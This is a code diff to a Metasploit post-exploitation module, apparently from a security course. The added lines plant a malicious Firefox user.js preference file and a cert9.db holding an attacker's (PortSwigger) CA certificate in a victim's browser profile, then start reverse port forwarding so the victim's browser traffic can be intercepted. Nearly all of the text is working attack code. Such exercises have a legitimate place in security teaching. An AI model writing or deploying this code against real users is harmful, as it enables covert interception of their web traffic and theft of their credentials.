@@ -41,12 +41,24 @@ class MetasploitModule < Msf::Post
     end
 
     # Attempt to write the user.js file
-    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\s5dh10zn.default\user.js', '/root/itp325/browser-pivot/user.js')
+    print_status("Uploading a malicious preference file")
+    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\user.js', '/root/itp325/browser-pivot/user.js')
     if res.nil?
-	print_error "upload failed"
+	print_error "Upload failed"
     else
-	print_good "#{res}"
+	print_good "Upload successful"
     end
+
+    # Upload PortSwagger CA to victim
+    print_status("Uploading malicious Certificate")
+    res = upload_file('c:\Users\admin\AppData\Roaming\Mozilla\Firefox\Profiles\cr3z9a1y.default-1523519120958\cert9.db', '/root/itp325/browser-pivot/cert9.db')
+    if res.nil?
+	print_error "Upload failed"
+    else
+	print_good "Upload successful"
+    end
+
+    # Find a way to forward the response back to the victim
 
     # Attempt to open port forwarding
     print_status("Starting reverse port forwarding")
